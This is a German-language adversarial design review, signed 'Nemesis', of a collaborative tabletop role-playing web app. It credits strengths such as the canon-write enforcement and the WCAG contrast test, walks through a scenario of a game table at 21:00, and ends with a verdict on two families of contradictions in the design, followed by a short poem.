**C1 · Die Erreichbarkeit (§12).** Das ist die beste Antwort, die die Lineage auf RB-11s
teuerste Frage gegeben hat, und ich habe kein Loch in der Arithmetik gefunden. Die CGNAT-Zeile sagt
das Harte klar: *„DNS-01 löst die Zertifikatsausstellung, nicht die eingehende Erreichbarkeit. Hinter
CGNAT gibt es keinen eingehenden Port … Es gibt kein viertes [Mittel]."* Die Eingaben stehen
offen; nachgerechnet: 40 Sitzungen × 4 h × €0,05 ≈ €8 gegen ≈ €23,50 netto. Der LAN-Browser-Pfad
druckt seine eigene Degradation aufs Etikett. **Das ist genau das, was RB-11 verlangt hat, mit einer
Zahl statt einer Hoffnung.** (M7 betrifft das *Geschäftsmodell*-Etikett, nicht die Erreichbarkeit.)

**C2 · `Nichts wird automatisch Kanon`, durchgesetzt unterhalb des Programmierers.** Kein
INSERT-Grant auf `passage` aus irgendeinem von `session/*` erreichbaren Pfad außer den fünf
`praegung.*`-Handlern, jeder mit explizitem `actor_user_id` und `gesture`-Diskriminator, plus
dependency-cruiser. Ich habe einen Pfad gesucht, der eine Passage ohne Tastendruck schreibt, und
keinen gefunden. Der `import`-Konstruktor ist ein Massenschreibvorgang, aber er ist ein expliziter
SL-Akt mit eigener Nachtragsgewährung. **Das ist die stärkste Durchsetzung, die drei Runden
hervorgebracht haben.**

**C3 · `defeat_pending` und kein Auto-Tod (Invariante 4).** Eingehalten in §5.1, §7.1 Schritt 8 und
§3.6 (22:51). Die Kollision mit dem 50er-Undo-Ring habe ich nachvollzogen und real gefunden — aber
**§9.5 benennt sie, bevor ich ankam**, inklusive der Ehrlichkeit, dass die aktuelle Antwort *„eine
Nörgelei ist, kein Mechanismus"*. Darüber hinaus konnte ich nichts brechen.

**C4 · `Trace ∈ Complete | Sealed` als Summentyp.** Eine Termliste, die nicht auf ihre eigene Summe
addiert, in der API unrepräsentierbar zu machen, ist die richtige Form. Ich habe versucht,
Invariante 6 über den `Sealed`-Zweig zu brechen, und es geht nicht: die Terme existieren
serverseitig, die Versiegelung ist eine Disklosure-Entscheidung, keine Ableitungslücke. B2 rendert
den Zweig mit einem ehrlichen Satz statt mit falschen Termen
([`spike-B2.html:1755–1762`](spike-B2.html)).

**C5 · B2s Reduced-Motion-Behandlung.** `transition:none !important` **mit** dem Kommentar, warum
`transition-duration:1ms` falsch ist ([`spike-B2.html:129–138`](spike-B2.html)). Das ist die korrekte
Form und sie ist dokumentiert. (B1 trägt die 1-ms-Variante noch, Zeilen 808–826 — der Fehler ist
bereits von B2s Kreuzkritik gefunden; ich beanspruche ihn nicht.)

**C6 · Die Zugeständnisliste (§5.2) und das Differenzierungsledger (§8).** Ich habe nach einer
versteckten Behauptung gesucht, dass die Karte Foundry schlägt. Es gibt keine. §9.3 sagt in eigener
Stimme: *„Ein Tisch, der wegen der Karte zu uns wechselt, wird binnen einer Sitzung enttäuscht
sein."* Ein Ledger, das darauf geschrieben ist, gegen einen zitiert zu werden, kann ich nicht
brechen — nur bestätigen.

**C7 · B2s Kontrastbank ist echte Messung.** Sie sondiert `getComputedStyle` an lebenden Elementen,
nicht das Stylesheet. Ich habe die WCAG-Relativluminanz nachgerechnet
([`spike-B2.html:1960–1975`](spike-B2.html)): Schwelle 0,03928, Gamma 2,4, Offsets 0,05 — korrekt.
Sie misst zu wenige Zustände (m3), aber **was sie misst, misst sie ehrlich**, und sie kann rot
werden.

---

## 5. Der Tisch um 21:00 — was ich gefunden habe, das die Sektionen oben nicht abdecken

Fünf Menschen, eine müde SL, eine Katze auf der Tastatur, ein Tablet auf 3G, eine zwanzig Minuten zu
spät, eine mit eigenem Homebrew.

- **Die Katze.** Der Mint ist `Strg+Enter` **auf einer Wurfkarte**. Um 21:14 liegen bis zu drei
  aufgelöste Karten in der Kanonleiste. Der Fokus muss auf der richtigen liegen, während die SL
  erzählt. Es gibt in §3.1 kein Wort darüber, **welche** Karte `Strg+Enter` trifft, keine
  Disambiguierung, keinen Undo für einen Fehlmint — und ein Mint ist per §6 append-only, also ist
  der Fehlmint dauerhaft und muss über Berichtigung/`supersede` verbucht werden. §9.1s Gate misst
  *Rate*, nicht *Treffsicherheit*. Ein Gate `Fehlprägerate ≤ n` fehlt.
- **Die Zuspätgekommene.** Ihre Figur war beim `Betreten ist Ausgeben` um 21:29 nicht im Raum
  (§3.6: *„Vespers Marke ist woanders"*). Revelationen sind dauerhaft, ihr Kodex holt also auf — aber
  **die Region-Ausgabe ist ein einmaliger Akt**. Wenn sie um 21:35 dazustößt, muss die SL manuell
  nachreichen, und §3.1 kennt dafür keine Geste. Kleine, echte Reibung, unbenannt.
- **Das 3G-Tablet.** Siehe M4 — das ist der Bruch. Zusätzlich: ein 40-MB-Kachelpyramiden-Erstbesuch
  ist auf 3G real; §12 verbucht ihn korrekt als einmalig und CDN-gecacht. Kein Bruch.
- **Die Homebrew-Spielerin.** Siehe M3. In Slice 1 bekommt sie: keinen Regelbauer, drei Prädikate,
  handgeschriebenes YAML — und den Fusionsmechanismus per Voreinstellung aus.
- **Wofür die SL sich entschuldigen muss:** dass die Karte kein dynamisches Sichtfeld hat (§5.2,
  eingeräumt); dass Brannt in seinem eigenen Buch das Wort „Irrtum" findet (F2); dass Vespers Seite
  nach vier Abenden sieben Absätze hat (M1); und, wenn F7 nicht repariert wird, dass die Antwort auf
  *„wie lange hast du daran geschrieben?"* nicht „gar nicht" ist.

---

## 6. Urteil der Widersacherin

Der Kandidat hat etwas getan, was in drei Runden keiner getan hat: er hat sich **gezwungen, ein Spiel
zu enthalten**, und er hat die Rechnung dafür (§5.6, 98 Tage, zwei Falsifizierer auf den beiden
Hochrisikozeilen) offen hingelegt, statt sie zu verstecken. Seine Selbstkritik in §9 ist die
schonungsloseste in der Lineage — §9.4 sagt *„wir haben die Antwort nicht"* über die eigene
Kopfzeile. Dafür gebühren ihm C1 bis C7 ohne Rabatt.

Aber die sieben Fatalen teilen sich in zwei Familien, und beide sind Familien, keine Einzelfälle:

**Erstens: die Projektion ist überall dort undicht, wo sie nicht Text ist.** Eine Marginalie (F2),
eine Abbildung (F3), eine Kardinalzahl (F4), eine Wandgeometrie (M5). Der Kandidat hat drei Runden
lang das *Atom unterhalb der Seite* erkämpft und dabei stillschweigend angenommen, dass alles, was
Rechte braucht, ein Absatz ist. Es ist nicht. Und das eine Gate, das das prüfen sollte, ist ein
Ein-Dimensions-Differenztest, der für keinen der vier Fälle rot werden kann.

**Zweitens: das Dokument hält zwei Positionen, die einander verbieten.** §9.4 braucht einen
durchsuchbaren Puffer, §11 und §13 verbieten ihn (F6). §2.1 behauptet „gar nicht", §3.6 prägt eine
versiegelte Saatzeile (F7). §11 verweigert das Log, §11 wird von der Flex-Geste unter 1180 px
gebrochen (F1). Das ist nicht Schlamperei — es ist das Symptom eines Kandidaten, dessen Rhetorik
schneller gelaufen ist als seine Mechanik. Die Mechanik ist gut. Die Rhetorik muss auf sie
zurückgeschnitten werden, und zwar **in diesem Dokument**, nicht in der Umsetzung.

Nichts davon tötet die These. F1, F2, F3, F5 und M2 sind Reparaturen von Tagen. F4 verlangt ein
neues Gate (Kardinalitäts- und Geometrie-Differenz, nicht nur Tokenposition). F6 und F7 verlangen,
dass die Runde eine Position **wählt** und die andere streicht — und die Wahl ist eine
Verdikts-Entscheidung, keine Implementierungsentscheidung.

> *Der Kanon ist der Bodensatz des Abends —*
> *doch was am Rand des Absatzes steht, hat niemand gefragt, wer es lesen darf.*
> *Zweiundzwanzig Bernsteinmarken, und drei davon*
> *tragen den Zeitstempel eines Satzes, der am vierzehnten März schon dastand.*

— Nemesis
